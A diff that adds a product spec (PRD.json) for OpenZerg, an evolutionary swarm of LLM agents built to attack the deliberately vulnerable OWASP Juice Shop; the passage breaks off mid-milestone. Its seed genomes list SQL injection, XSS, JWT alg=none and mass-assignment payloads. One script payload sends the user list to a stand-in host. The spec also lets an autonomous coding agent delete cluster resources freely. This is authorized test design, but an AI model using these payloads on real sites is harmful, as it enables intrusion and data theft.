@@ -1,0 +1,739 @@
+{
+  "schema_version": "1.0",
+  "name": "OpenZerg",
+  "version": "2.0.0",
+  "codename": "endpoint-pivot",
+  "generated_at": "2026-05-23",
+  "owner": "Carson",
+  "repo": "github.com/TheApexWu/openzerg",
+
+  "tagline": "We don't send one smart attacker. We send a hundred dumb ones, watch which find cracks, and breed the next generation from the survivors.",
+
+  "mission": {
+    "one_liner": "Evolutionary, agentic red-team swarm that attacks a known web endpoint until it finds an exploit or converges, then explains how it got there.",
+    "long": "OpenZerg is a Go control plane that spawns a Kubernetes-backed swarm of PI agent pods (model: Gemma 4 via OpenRouter). Each pod is a tiny autonomous penetration tester aimed at a fixed HTTP/ws/tcp target. The control plane scores every probe by fitness, kills the weak, mutates the strong, and respawns the next generation. The loop runs until a full breach is found or max generations is reached, then writes a short human-readable summary describing the path the swarm took to its Outcome.",
+    "what_changed_from_v1": [
+      "Target is now an external HTTP web app (OWASP Juice Shop, white-hat), not an in-cluster AI sandbox.",
+      "Language is Go, not Python. The Python controller/attack scripts are reference material only and will be deleted in M6.",
+      "Kubernetes cluster is the live DigitalOcean cluster (kubeconfig already configured), not Kind.",
+      "Attacker = PI agent (https://pi.dev/) running Gemma 4 via OpenRouter. Nimble.ai is used by the agent to navigate / scrape the target.",
+      "Datadog integration is DROPPED for v1 to keep the 1-day scope tight. PI + Nimble satisfy the >=2 sponsor tools criterion.",
+      "Control plane is a local binary that talks to the remote cluster via the user's kubeconfig (NOT an in-cluster deployment)."
+    ]
+  },
+
+  "context": {
+    "hackathon": {
+      "name": "Agentic Engineering Hack",
+      "venue": "Datadog NYC",
+      "date": "2026-05-23",
+      "judging_criteria": [
+        "Autonomy: agent acts on the web with real-time data, no manual intervention.",
+        "Tool Use: at least 2 sponsor tools integrated.",
+        "Idea: meaningful real-world value.",
+        "Technical Implementation.",
+        "Demo: 3 minutes."
+      ],
+      "scope": "White-hat only. Target is a known-vulnerable demo app the team is authorized to attack. NO attempts at sandbox escape, container escape, host escape, or cloud account escalation. NO scanning of unrelated targets."
+    },
+    "target": {
+      "name": "OWASP Juice Shop",
+      "url": "https://juice-shop-production-d0c5.up.railway.app",
+      "kind": "intentionally-vulnerable web app",
+      "known_vector_families": [
+        "SQL injection on /rest/user/login (classic ' OR 1=1-- bypass)",
+        "Broken authentication / JWT tampering",
+        "BOLA / IDOR on /api/Users, /api/Feedbacks, /api/BasketItems",
+        "Reflected and stored XSS via search, feedback, comment fields",
+        "Sensitive data exposure in /ftp directory, /robots.txt, /package.json",
+        "Improper input validation on /rest/products/search and admin endpoints",
+        "JWT key confusion / 'alg: none' acceptance",
+        "Path traversal on /ftp"
+      ],
+      "rules_of_engagement": [
+        "Rate limit: max 10 req/s per attacker pod, max 60 req/s aggregate.",
+        "No destructive payloads (no DROP TABLE, no admin password resets that lock real users out).",
+        "Read-only exploit verification: prove the bug, don't trash the data.",
+        "Mark every request with header X-OpenZerg-Probe: true so Juice Shop ops (us) can identify our traffic."
+      ]
+    },
+    "infra": {
+      "kubernetes": {
+        "provider": "DigitalOcean Managed Kubernetes",
+        "context_name": "do-nyc1-k8s-1-36-0-do-0-nyc1-1779544226353",
+        "control_plane_endpoint": "https://276dd02b-98fd-4eb4-be61-36bc9340b349.k8s.ondigitalocean.com",
+        "kubeconfig_path": "/home/carson/.kube/config",
+        "namespace": "openzerg",
+        "namespace_must_be_created_by_ralph": true,
+        "existing_resources_policy": "FREE_TO_DELETE. The cluster may already contain pods, deployments, services, secrets, configmaps, namespaces, or other resources from prior experiments. All of them are disposable; the ralph is authorized to `kubectl delete` anything it finds in order to make room for the openzerg namespace and its workloads. Do not preserve prior state. Exception: do NOT delete the kube-system namespace or any DigitalOcean-managed system components (do-*, csi-*, cilium*, konnectivity-*). If unsure, leave a node alone."
+      },
+      "registry": {
+        "name": "DigitalOcean Container Registry",
+        "url": "registry.digitalocean.com/openzerg",
+        "login_command": "doctl registry login",
+        "images_to_publish": [
+          "registry.digitalocean.com/openzerg/pi-attacker:latest"
+        ],
+        "control_plane_is_published": false,
+        "control_plane_runs_locally": true
+      },
+      "doctl": {
+        "binary": "/usr/local/bin/doctl",
+        "authenticated": true
+      },
+      "go": {
+        "version_available": "go1.26.3",
+        "module_root": "/home/carson/openzerg/backend",
+        "module_path": "github.com/TheApexWu/openzerg/backend"
+      }
+    },
+    "secrets": {
+      "policy": "Never commit a key. Always read from env or local file outside the repo.",
+      "openrouter_api_key": {
+        "env_var": "OPENROUTER_API_KEY",
+        "search_order": [
+          "/home/carson/.pi/agent/auth.json (key 'openrouter' or 'OPENROUTER_API_KEY')",
+          "/home/carson/openzerg/.env (line OPENROUTER_API_KEY=...)",
+          "process env"
+        ],
+        "if_missing_action": "Print a clear error telling the user where to put the key. Do NOT block ralph progress on code that does not need the key (compilation, unit tests, dry-run mode)."
+      },
+      "nimble_api_key": {
+        "env_var": "NIMBLE_API_KEY",
+        "search_order": [
+          "/home/carson/openzerg/.env (line NIMBLE_API_KEY=...)",
+          "process env"
+        ],
+        "if_missing_action": "Same as OpenRouter: log clearly, gate only the live-call paths."
+      },
+      "loading_helper": {
+        "package": "internal/secrets",
+        "behavior": "Read .env file at module root (no panic if absent), then overlay process env, then return a typed Config struct. Used by both binaries."
+      }
+    }
+  },
+
+  "non_goals": [
+    "Do NOT attempt to attack anything other than the configured TARGET_URL.",
+    "Do NOT attempt to escape the Kubernetes pods themselves; the pods are sandboxes for our attackers, not the target.",
+    "Do NOT implement a frontend / WebSocket / React UI. v1 is CLI + structured logs only. The HTML files in repo root are v1 artifacts and will be removed in M6.",
+    "Do NOT integrate Datadog in v1. Stretch only.",
+    "Do NOT port the 18 Python attack vectors literally. The new attack vectors are HTTP-shaped (SQLi, XSS, BOLA, etc.) and the PI agent generates them with Nimble's help.",
+    "Do NOT publish the control-plane image; it runs locally.",
+    "Do NOT use Ollama, Kind, FastAPI, SQLite, or httpx (Python-era choices).",
+    "Do NOT use co-author / 'Generated with Claude' / 'Co-authored-by' trailers in commits."
+  ],
+
+  "principles": [
+    "Boring code, dramatic system behavior.",
+    "Every milestone must end with `go build ./...` green and (if any tests exist) `go test ./...` green.",
+    "Each PI attacker pod is disposable: spawns, attacks, prints a JSON result, exits.",
+    "The control plane is the only stateful piece. It is restartable; resumed runs are NOT required for v1.",
+    "Concurrency: 15 pods per generation, all running in parallel via k8s. Control plane uses goroutines + errgroup to read their logs.",
+    "Fail loud, fail fast. A pod that errors out scores 0.0 and the run continues.",
+    "All long-running work is cancellable via context.Context."
+  ],
+
+  "stack": {
+    "language": "Go",
+    "go_version": "1.26+",
+    "module_path": "github.com/TheApexWu/openzerg/backend",
+    "module_root_dir": "/home/carson/openzerg/backend",
+    "key_libs": [
+      "k8s.io/client-go (cluster API + log streaming)",
+      "k8s.io/apimachinery (types)",
+      "github.com/spf13/cobra OR stdlib flag (CLI)",
+      "github.com/joho/godotenv (read .env)",
+      "golang.org/x/sync/errgroup (concurrent pod waits)",
+      "log/slog (structured logs)",
+      "encoding/json (everywhere)",
+      "net/http (Nimble + OpenRouter clients, target probes when needed)"
+    ],
+    "attacker_pod_runtime": {
+      "base_image": "ghcr.io/pi-dev/agent OR pi.dev official image, pinned to a specific tag (ralph must look up the latest tag from pi.dev docs)",
+      "fallback_base_image": "If no official image: ubuntu:24.04 + install PI CLI per pi.dev docs.",
+      "language_inside_pod": "Whatever PI's runtime is (likely TypeScript or a wrapped binary). The Go side never runs inside the pod."
+    }
+  },
+
+  "repo_layout": {
+    "root": "/home/carson/openzerg",
+    "tree_after_M6": {
+      "PRD.json": "this file",
+      "README.md": "short top-level readme (created in M6, not before)",
+      ".env.example": "kept, updated with OPENROUTER_API_KEY",
+      ".gitignore": "kept",
+      "backend/": {
+        "go.mod": "module github.com/TheApexWu/openzerg/backend",
+        "go.sum": "checked in",
+        "cmd/": {
+          "openzerg/main.go": "control plane CLI entrypoint"
+        },
+        "internal/": {
+          "config/": "env + .env + flags",
+          "k8s/": "pod spawn, log stream, delete",
+          "pi/": "PI agent invocation wrapper (used inside pod binary if any, OR pure helpers)",
+          "openrouter/": "thin OpenRouter client (used by control plane for mutation, NOT by pods)",
+          "nimble/": "Nimble.ai client used by pods to navigate target",
+          "evolve/": "fitness scoring, mutation, generation orchestration",
+          "spawn/": "high-level pod orchestrator: build manifest, launch, await, parse",
+          "store/": "in-memory run state + JSON summary writer",
+          "attacks/": "Go-side genome catalog + mutation helpers (data, not Python ports)",
+          "secrets/": "load and resolve API keys"
+        },
+        "docker/": {
+          "pi-attacker/": {
+            "Dockerfile": "builds the attacker pod image",
+            "entrypoint.sh": "starts PI agent with TARGET_URL + GENOME envs and prints final JSON line",
+            "skills/attacker/": "PI skill files (yaml/md per pi.dev format). Ralph must research pi.dev docs first.",
+            "prompts/": "system prompt + user prompt templates that reference Nimble"
+          }
+        },
+        "deploy/": {
+          "namespace.yaml": "openzerg namespace + minimal NetworkPolicy",
+          "rbac.yaml": "ServiceAccount + Role (empty perms; pods need none)",
+          "pod-template.yaml": "Reference manifest; the Go code is the source of truth and renders pods programmatically"
+        }
+      },
+      "scripts/": {
+        "build-and-push-attacker.sh": "doctl registry login && docker build && docker push",
+        "run-local.sh": "wrapper that loads .env and invokes the openzerg binary"
+      },
+      "docs/": {
+        "DEMO.md": "3-minute demo script (M5)",
+        "ARCHITECTURE.md": "1-pager (M5)"
+      }
+    },
+    "to_delete_in_M6": [
+      "backend/controller.py",
+      "backend/attacks/__init__.py",
+      "backend/attacks/*.py",
+      "backend/run.sh",
+      "backend/requirements.txt",
+      "backend/results.db*",
+      "index.html",
+      "openzerg-map.html",
+      "replay.json",
+      "vendor/ (Phaser asset bundle)",
+      "prototypes/",
+      "scripts/dev_server.py"
+    ]
+  },
+
+  "architecture": {
+    "summary": "Local Go binary `openzerg` reads TARGET_URL, then runs an evolution loop. Each generation: render N pod manifests with random genomes, kubectl-apply via client-go, stream stdout of each pod in parallel, wait for pod exit, parse the final JSON line as the probe result, score fitness, delete pod. Survivors (fitness > 0.1) feed into a mutation step (Go-side mutation + optional OpenRouter call) that produces the next generation's genomes. Loop ends on fitness=1.0 in any pod, OR after MAX_GENERATIONS, OR on user Ctrl-C. Final summary JSON + a short Markdown narrative are written to stdout and to ./out/summary-<run_id>.{json,md}.",
+    "diagram_ascii": "+--------------------+\n|  user shell        |\n|  TARGET_URL=...    |\n|  ./openzerg        |\n+---------+----------+\n          |\n          v\n+--------------------+        +------------------------+\n|  control plane     |------->|  DigitalOcean K8s      |\n|  (Go binary, local)|        |  namespace: openzerg   |\n|  - evolve loop     |        |  pods: attacker-g<N>-* |\n|  - k8s client-go   |<-------|  one PI agent per pod  |\n|  - openrouter MUT  |  logs  |  (Gemma 4 + Nimble)    |\n|  - summary writer  |        +-----------+------------+\n+---------+----------+                    |\n          |                                v\n          |                    +------------------------+\n          |                    |  TARGET_URL (Juice     |\n          |                    |  Shop on Railway)      |\n          |                    +------------------------+\n          v\n  ./out/summary-<id>.json + .md",
+    "components": [
+      "control-plane (Go, local)",
+      "attacker-pod-image (Docker, runs PI+Gemma4+Nimble)",
+      "k8s namespace + rbac (one-time setup)",
+      "OpenRouter (LLM provider, used by both control-plane MUT step and inside attacker pod)",
+      "Nimble.ai (web automation, used inside attacker pod to navigate target)"
+    ]
+  },
+
+  "components": [
+    {
+      "id": "control-plane",
+      "binary": "openzerg",
+      "build": "go build -o ./bin/openzerg ./cmd/openzerg",
+      "run": "TARGET_URL=https://juice-shop-production-d0c5.up.railway.app ./bin/openzerg run",
+      "purpose": "Local CLI that orchestrates the evolutionary attack swarm against TARGET_URL and writes the final Outcome summary.",
+      "responsibilities": [
+        "Parse CLI flags + env vars; validate TARGET_URL is set.",
+        "Load OPENROUTER_API_KEY and NIMBLE_API_KEY (warn but do not exit if MUT step keys are absent; pods need NIMBLE_API_KEY though).",
+        "Connect to k8s cluster via $KUBECONFIG or in-cluster fallback.",
+        "Create namespace if missing.",
+        "For each generation 1..MAX_GENERATIONS: render pod specs from current population, create pods, stream logs, await completion, parse JSON result line, score fitness, save to in-memory store.",
+        "Mutate survivors (fitness > 0.1) into next generation. Use OpenRouter (Gemma 4) when key present; fallback to pure-Go random mutation when not.",
+        "Stop on first fitness==1.0 OR after MAX_GENERATIONS.",
+        "Always delete pods after parsing results (whether success or error).",
+        "Write summary-<run_id>.json and summary-<run_id>.md to ./out/.",
+        "Print a human-readable narrative to stdout."
+      ],
+      "subcommands": [
+        {"name": "run", "desc": "Run a full evolution. The primary command."},
+        {"name": "doctor", "desc": "Print env / k8s / registry / secret status, no side effects."},
+        {"name": "version", "desc": "Print build SHA + go version."}
+      ],
+      "flags": [
+        {"name": "--target", "env": "TARGET_URL", "required": true, "desc": "Target URL to attack. Full URL with scheme."},
+        {"name": "--generations", "env": "MAX_GENERATIONS", "default": 4},
+        {"name": "--population", "env": "POPULATION_SIZE", "default": 15},
+        {"name": "--namespace", "env": "K8S_NAMESPACE", "default": "openzerg"},
+        {"name": "--image", "env": "ATTACKER_IMAGE", "default": "registry.digitalocean.com/openzerg/pi-attacker:latest"},
+        {"name": "--dry-run", "env": "OPENZERG_DRY_RUN", "default": false, "desc": "Don't actually create pods; emit fake results for plumbing tests."},
+        {"name": "--out-dir", "env": "OPENZERG_OUT_DIR", "default": "./out"},
+        {"name": "--rate-limit", "env": "RATE_LIMIT_RPS", "default": 60, "desc": "Aggregate ceiling across all pods. Passed into each pod env."}
+      ]
+    },
+    {
+      "id": "attacker-pod-image",
+      "image": "registry.digitalocean.com/openzerg/pi-attacker:latest",
+      "purpose": "A disposable container that runs a single PI agent attempt against TARGET_URL with a given GENOME, then prints exactly one final JSON line to stdout.",
+      "responsibilities": [
+        "Start PI agent (per pi.dev docs).",
+        "Configure PI to use OpenRouter with model google/gemma-4-26b-a4b-it (or 31b-it).",
+        "Equip PI with the 'attacker' skill (in /home/agent/.pi/skills/attacker/) which has tools for: making HTTP requests, calling Nimble for browser-style navigation, parsing JSON, and reporting findings.",
+        "System prompt: white-hat scope, target URL, attack vector hint (from GENOME), rules of engagement, output schema.",
+        "On agent completion (or timeout), the entrypoint MUST emit exactly one final line to stdout matching the result schema (see data_contracts.attacker_result_jsonl).",
+        "Exit 0 on a clean run regardless of breach/no-breach. Exit 2 on infrastructure error (missing key, network down)."
+      ],
+      "env_vars_received": [
+        "TARGET_URL",
+        "GENOME (JSON string with vector, technique, params, hint)",
+        "GENERATION (int)",
+        "RUN_ID (string)",
+        "POD_ID (string)",
+        "OPENROUTER_API_KEY (from k8s Secret)",
+        "NIMBLE_API_KEY (from k8s Secret)",
+        "RATE_LIMIT_RPS",
+        "TIMEOUT_SECONDS (default 60)"
+      ],
+      "output_contract": "Last non-empty line of stdout MUST be a single-line JSON object matching attacker_result_jsonl schema. All other stdout lines are free-form logs (recommended: structured JSON lines with type=log).",
+      "skill_files_to_author": [
+        "backend/docker/pi-attacker/skills/attacker/skill.yaml (per pi.dev format)",
+        "backend/docker/pi-attacker/skills/attacker/instructions.md",
+        "backend/docker/pi-attacker/prompts/system.tmpl"
+      ]
+    },
+    {
+      "id": "k8s-resources",
+      "purpose": "Cluster prerequisites: namespace, ServiceAccount, optional egress NetworkPolicy.",
+      "files": [
+        "backend/deploy/namespace.yaml",
+        "backend/deploy/rbac.yaml",
+        "backend/deploy/secret.example.yaml"
+      ],
+      "secret_creation": "Create the openrouter+nimble Secret manually OR via `openzerg doctor --create-secret`. NEVER commit real secret YAML.",
+      "secret_name": "openzerg-keys",
+      "secret_keys": ["OPENROUTER_API_KEY", "NIMBLE_API_KEY"]
+    }
+  ],
+
+  "integrations": {
+    "pi": {
+      "what": "PI is the agent framework that runs inside each attacker pod. It executes the LLM loop, calls tools (Nimble, HTTP), and reports findings.",
+      "homepage": "https://pi.dev/",
+      "docs": "https://pi.dev/docs (ralph MUST WebFetch this on first M3 iteration before writing the Dockerfile; record the exact CLI/image name in docs/ARCHITECTURE.md)",
+      "local_install_hint": "/home/carson/.pi/agent/models.json already exists with OpenRouter+Gemma 4 configured. Mirror that config inside the pod image.",
+      "model_config_local_path": "/home/carson/.pi/agent/models.json",
+      "model_ids_available": ["google/gemma-4-26b-a4b-it", "google/gemma-4-31b-it"],
+      "model_preferred": "google/gemma-4-26b-a4b-it",
+      "skill_dir_inside_pod": "/home/agent/.pi/skills/attacker/",
+      "ralph_must_research_before_use": true,
+      "research_questions_for_ralph": [
+        "What is the exact PI CLI invocation that runs one session non-interactively?",
+        "What is PI's skill manifest format (yaml schema)?",
+        "How does PI expose tools to the model (functions vs schemas)?",
+        "Does PI have an official Docker image? If yes, what tag?",
+        "How does PI surface tool errors (so we can route them to fitness=0.0)?"
+      ]
+    },
+    "openrouter": {
+      "what": "LLM provider. Hosts Gemma 4 for both (a) inside-pod PI agent inference and (b) optional control-plane mutation step.",
+      "base_url": "https://openrouter.ai/api/v1",
+      "auth": "Bearer header with OPENROUTER_API_KEY",
+      "model_ids": ["google/gemma-4-26b-a4b-it", "google/gemma-4-31b-it"],
+      "control_plane_usage": "When MUT step needs LLM-driven mutation of survivor genomes, the control plane POSTs to /chat/completions with a short prompt: 'These attacks partially worked: <evidence>. Generate N mutated variants targeting <target>. Return JSON array.' Fallback to pure-Go random mutation when key absent.",
+      "budget_guardrail": "Hard cap of 32 OpenRouter calls per run. Track in a counter; abort MUT step and fall back to random when exceeded."
+    },
+    "nimble": {
+      "what": "REQUIRED sponsor tool. Web automation / scraping infrastructure used by the PI agent inside each pod to navigate the target site.",
+      "docs": "https://docs.nimbleway.com/llms.txt (ralph MUST WebFetch this on first M4 iteration before writing the Nimble client)",
+      "homepage": "https://nimbleway.com/",
+      "auth_env": "NIMBLE_API_KEY",
+      "primary_uses": [
+        "Fetch JS-rendered pages from the target (Juice Shop is an Angular SPA; static curl misses dynamic content).",
+        "Run authenticated session flows (login attempts, basket manipulation).",
+        "Optional CVE recon: query Nimble's web SDK for 'OWASP Juice Shop CVE' style searches to seed Gen-1 hints."
+      ],
+      "client_package": "internal/nimble (Go package). Even though the live calls happen inside the pod, the control plane uses Nimble at startup to optionally fetch CVE seeds.",
+      "ralph_must_research_before_use": true,
+      "research_questions_for_ralph": [
+        "Exact endpoint URL(s) for Nimble's web/page fetch API.",
+        "Request/response schema (the .env.example contains NIMBLE_API_URL with a hex token, which is suspicious; resolve whether this is a key or a URL).",
+        "Rate limits and quotas.",
+        "How to surface Nimble responses as tool outputs to PI."
+      ]
+    },
+    "kubernetes": {
+      "client": "k8s.io/client-go, loaded via clientcmd from $KUBECONFIG (default /home/carson/.kube/config) with in-cluster fallback.",
+      "namespace": "openzerg",
+      "rbac": "Not required for control plane (uses user's kubeconfig). Pods need ServiceAccount with NO permissions (default token can be off).",
+      "pod_spec_essentials": {
+        "restartPolicy": "Never",
+        "activeDeadlineSeconds": 120,
+        "automountServiceAccountToken": false,
+        "containers[0].image": "registry.digitalocean.com/openzerg/pi-attacker:latest",
+        "containers[0].env": "from openzerg-keys Secret + per-pod genome",
+        "containers[0].resources.limits": {"cpu": "500m", "memory": "512Mi"},
+        "containers[0].securityContext": {"runAsNonRoot": true, "readOnlyRootFilesystem": false, "allowPrivilegeEscalation": false}
+      },
+      "image_pull_secret": "Pods pull from DO registry. Either (a) use a docker-registry imagePullSecret created from `doctl registry kubernetes-manifest | kubectl apply -f -` or (b) accept that the cluster is already linked to the registry. Ralph: try (b) first."
+    },
+    "registry": {
+      "url": "registry.digitalocean.com/openzerg",
+      "login": "doctl registry login",
+      "build_push_script": "scripts/build-and-push-attacker.sh"
+    }
+  },
+
+  "data_contracts": {
+    "control_plane_env": {
+      "TARGET_URL": "string, required, full URL (https://...)",
+      "MAX_GENERATIONS": "int, default 4",
+      "POPULATION_SIZE": "int, default 15",
+      "K8S_NAMESPACE": "string, default 'openzerg'",
+      "ATTACKER_IMAGE": "string, default 'registry.digitalocean.com/openzerg/pi-attacker:latest'",
+      "OPENROUTER_API_KEY": "string, optional for control plane (only needed for LLM-driven mutation)",
+      "NIMBLE_API_KEY": "string, optional for control plane (needed if CVE seeding enabled)",
+      "OPENZERG_DRY_RUN": "bool, default false",
+      "OPENZERG_OUT_DIR": "string, default './out'",
+      "RATE_LIMIT_RPS": "int, default 60"
+    },
+    "attacker_pod_env": {
+      "TARGET_URL": "string, required",
+      "GENOME": "JSON string, required",
+      "GENERATION": "int, required",
+      "RUN_ID": "string, required",
+      "POD_ID": "string, required",
+      "OPENROUTER_API_KEY": "string, required (from k8s Secret)",
+      "NIMBLE_API_KEY": "string, required (from k8s Secret)",
+      "RATE_LIMIT_RPS": "int, required",
+      "TIMEOUT_SECONDS": "int, default 60"
+    },
+    "genome_schema": {
+      "type": "object",
+      "fields": {
+        "vector": "string, e.g. 'sqli_login', 'xss_search', 'bola_users', 'jwt_alg_none', 'path_traversal_ftp'",
+        "category": "string, one of: injection, auth, access_control, xss, data_exposure, validation",
+        "technique": "string, e.g. 'union_select', 'boolean_blind', 'reflected', 'stored', 'jwt_swap'",
+        "target_path": "string, e.g. '/rest/user/login'",
+        "params": "object, vector-specific (e.g. {payload: \"' OR 1=1--\"})",
+        "hint": "string, free-form, seed for the PI prompt",
+        "parent_pod_id": "string, optional; for tracing lineage"
+      }
+    },
+    "attacker_result_jsonl": {
+      "schema": {
+        "type": "result",
+        "run_id": "string",
+        "pod_id": "string",
+        "generation": "int",
+        "vector": "string",
+        "category": "string",
+        "status": "string, one of: BREACH | PARTIAL | RECON | NOOP | ERROR",
+        "fitness": "float in [0.0, 1.0]",
+        "evidence": "string, human-readable proof or error",
+        "raw_findings": "array of objects with {url, method, status_code, snippet}",
+        "duration_ms": "int",
+        "t": "int, unix ms"
+      },
+      "rule": "MUST be the final non-empty stdout line. MUST be single-line JSON. Control plane parses by scanning stdout from the end."
+    },
+    "final_summary_json": {
+      "path": "./out/summary-<run_id>.json",
+      "schema": {
+        "run_id": "string",
+        "target_url": "string",
+        "started_at": "ISO 8601",
+        "finished_at": "ISO 8601",
+        "duration_s": "number",
+        "generations_run": "int",
+        "total_pods": "int",
+        "outcome": "string, one of: BREACH | EXHAUSTED",
+        "best_fitness": "float",
+        "breach": "object|null with {pod_id, vector, category, evidence, raw_findings}",
+        "per_generation": "array of {generation, population, survivors, best_fitness, breaches}",
+        "narrative_md_path": "string"
+      }
+    },
+    "final_summary_md": {
+      "path": "./out/summary-<run_id>.md",
+      "shape": "Title, target, outcome line, then a short narrative (5-15 short paragraphs) explaining: what we tried in Gen 1, what survived, what mutations were applied, and the path to the Outcome. Written by control plane; for v1, generated from a Go template (no LLM). Stretch: LLM polish via OpenRouter."
+    },
+    "fitness_scoring": {
+      "rules_in_priority_order": [
+        {"if": "status==BREACH", "score": 1.0},
+        {"if": "evidence contains any of: 'admin token', 'auth bypass', 'arbitrary file read', 'sql error revealed schema', 'rce'", "score": 0.9},
+        {"if": "evidence contains any of: 'reflected payload', 'reflected xss', 'sql syntax error', 'jwt accepted with alg none', 'directory listing'", "score": 0.6},
+        {"if": "evidence contains any of: 'endpoint exists', '200 ok', 'version banner', 'robots disclosure', 'package.json exposed'", "score": 0.4},
+        {"if": "evidence contains any of: 'timeout', 'refused', 'blocked', '403', '401'", "score": 0.1},
+        {"if": "status==ERROR", "score": 0.0}
+      ],
+      "default_score": 0.0,
+      "implementation_location": "backend/internal/evolve/fitness.go",
+      "function_shape": "func Score(result Result) float64"
+    }
+  },
+
+  "evolution_loop": {
+    "population_size": 15,
+    "max_generations": 4,
+    "survivor_threshold": 0.1,
+    "survivor_cap": 7,
+    "mutation_strategy": {
+      "primary": "Pure-Go: shuffle params, swap technique within category, vary target_path from a curated list, occasionally cross-breed (swap params between two survivors).",
+      "secondary_if_openrouter_available": "Send survivors' evidence+params to Gemma 4 with a prompt asking for N mutated variants. Validate response is a JSON array matching genome_schema; fall back to primary on parse failure."
+    },
+    "stop_conditions": [
+      "any pod returns fitness==1.0 (status==BREACH) -> stop immediately, write summary with outcome=BREACH",
+      "generation count == max_generations -> stop, write summary with outcome=EXHAUSTED",
+      "context cancelled (Ctrl-C) -> write partial summary with outcome=EXHAUSTED and a note about cancellation"
+    ],
+    "seed_genomes_for_generation_1": [
+      {"vector": "sqli_login", "category": "injection", "technique": "tautology", "target_path": "/rest/user/login", "params": {"email_payload": "' OR 1=1--", "password": "x"}, "hint": "Try classic auth bypass via SQL tautology in email field."},
+      {"vector": "sqli_login_union", "category": "injection", "technique": "union_select", "target_path": "/rest/user/login", "params": {"email_payload": "' UNION SELECT 1,2,3,4,5--"}, "hint": "Try UNION-based info leak."},
+      {"vector": "xss_search_reflected", "category": "xss", "technique": "reflected", "target_path": "/#/search", "params": {"q": "<iframe src=javascript:alert(1)>"}, "hint": "Try reflected XSS via search query parameter."},
+      {"vector": "bola_users", "category": "access_control", "technique": "id_enumeration", "target_path": "/api/Users/1", "params": {}, "hint": "Try fetching admin user by ID without auth."},
+      {"vector": "bola_baskets", "category": "access_control", "technique": "id_enumeration", "target_path": "/rest/basket/1", "params": {}, "hint": "Try fetching another user's basket."},
+      {"vector": "jwt_alg_none", "category": "auth", "technique": "jwt_swap", "target_path": "/rest/user/whoami", "params": {"forge_alg": "none"}, "hint": "Forge a JWT with alg=none claiming admin."},
+      {"vector": "path_traversal_ftp", "category": "data_exposure", "technique": "dotdot", "target_path": "/ftp", "params": {"file": "../package.json.bak"}, "hint": "Try directory traversal in /ftp listing."},
+      {"vector": "data_exposure_pkgjson", "category": "data_exposure", "technique": "direct_get", "target_path": "/ftp/package.json.bak", "params": {}, "hint": "Direct fetch of package.json backup."},
+      {"vector": "data_exposure_robots", "category": "data_exposure", "technique": "direct_get", "target_path": "/robots.txt", "params": {}, "hint": "Read robots.txt for disallowed paths."},
+      {"vector": "admin_section", "category": "access_control", "technique": "force_browse", "target_path": "/#/administration", "params": {}, "hint": "Try to reach admin UI directly."},
+      {"vector": "feedback_xss_stored", "category": "xss", "technique": "stored", "target_path": "/api/Feedbacks", "params": {"comment_payload": "<script>fetch('/api/Users').then(r=>r.text()).then(t=>fetch('//x/?d='+btoa(t)))</script>"}, "hint": "Try stored XSS in feedback comment field."},
+      {"vector": "register_admin_role", "category": "auth", "technique": "param_pollution", "target_path": "/api/Users", "params": {"body": {"email": "z+<rand>@oz.dev", "password": "p", "role": "admin"}}, "hint": "Mass-assign role=admin during registration."},
+      {"vector": "rest_products_search_sqli", "category": "injection", "technique": "error_based", "target_path": "/rest/products/search", "params": {"q_payload": "')) UNION SELECT name,id,price,description,image,deluxePrice,createdAt,updatedAt,deletedAt FROM Users--"}, "hint": "Classic Juice Shop search SQLi for user table leak."},
+      {"vector": "captcha_bypass", "category": "validation", "technique": "skip_token", "target_path": "/api/Feedbacks", "params": {"omit_captcha": true}, "hint": "Submit feedback without captcha token."},
+      {"vector": "score_board", "category": "data_exposure", "technique": "force_browse", "target_path": "/#/score-board", "params": {}, "hint": "Find the hidden score-board route."}
+    ]
+  },
+
+  "milestones": [
+    {
+      "id": "M0",
+      "name": "Repo hygiene + Go module bootstrap",
+      "goal": "A buildable, empty Go module at backend/ with the package skeleton in place. No business logic yet.",
+      "tasks": [
+        "Initialize go.mod with module path github.com/TheApexWu/openzerg/backend.",
+        "Create backend/cmd/openzerg/main.go that prints 'openzerg vX.Y' and exits 0.",
+        "Create empty packages internal/{config,k8s,pi,openrouter,nimble,evolve,spawn,store,attacks,secrets} each with one .go file declaring the package.",
+        "Add .editorconfig if helpful.",
+        "Update .gitignore to add ./out/, ./bin/, *.exe.",
+        "DO NOT delete the Python files yet."
+      ],
+      "verify": [
+        "cd backend && go build ./...",
+        "cd backend && go vet ./...",
+        "./backend/bin/openzerg version || true (after build moves binary)"
+      ],
+      "acceptance": [
+        "go build ./... exits 0.",
+        "go vet ./... exits 0.",
+        "Binary prints a non-empty version string."
+      ]
+    },
+    {
+      "id": "M1",
+      "name": "Config, secrets, doctor command",
+      "goal": "openzerg doctor reports k8s connectivity, registry config, and secret presence without making any cluster changes.",
+      "tasks": [
+        "Implement internal/secrets: load .env (godotenv), overlay process env, expose typed Config.",
+        "Implement internal/config: CLI flags via stdlib flag or cobra, merge with env, produce a RuntimeConfig.",
+        "Wire `openzerg doctor` to print: kubeconfig path resolved, current-context, namespace status (does it exist?), registry login probe, OPENROUTER_API_KEY presence (yes/no, never print value), NIMBLE_API_KEY presence.",
+        "Add k8s client construction in internal/k8s with both in-cluster and out-of-cluster paths.",
+        "Add a no-op `openzerg run --dry-run` that prints what it would do but does nothing."
+      ],
+      "verify": [
+        "cd backend && go build ./...",
+        "cd backend && ./bin/openzerg doctor",
+        "cd backend && ./bin/openzerg run --target https://example.invalid --dry-run"
+      ],
+      "acceptance": [
+        "doctor prints a clean, multi-line report.",
+        "doctor exits 0 even when keys are missing (it must not crash).",
+        "run --dry-run prints a planned-pod-spec preview and exits 0."
+      ]
+    },
+    {
+      "id": "M2",
+      "name": "K8s pod spawn + log streaming (no PI yet)",
+      "goal": "Control plane can create a pod that runs `echo '<final-json>'`, stream its logs, parse the final JSON line, and delete the pod. End-to-end against the DO cluster.",
+      "tasks": [
+        "Create backend/deploy/namespace.yaml and apply via `openzerg run` first-time setup.",
+        "Implement internal/spawn: render a Pod object (k8s.io/api/core/v1) with image=busybox:1.36, command=['sh','-c','echo log1; echo log2; sleep 1; echo {\"type\":\"result\",...}'].",
+        "Implement internal/k8s: CreatePod, StreamLogs (follow=true), WaitForCompletion, DeletePod.",
+        "Implement internal/evolve.ParseLastJSONLine.",
+        "Glue: openzerg run launches 3 pods in parallel, prints their results, exits.",
+        "Add tests for ParseLastJSONLine with hostile inputs (no trailing newline, multiple json lines, garbage).",
+        "Do NOT yet integrate fitness scoring or generations."
+      ],
+      "verify": [
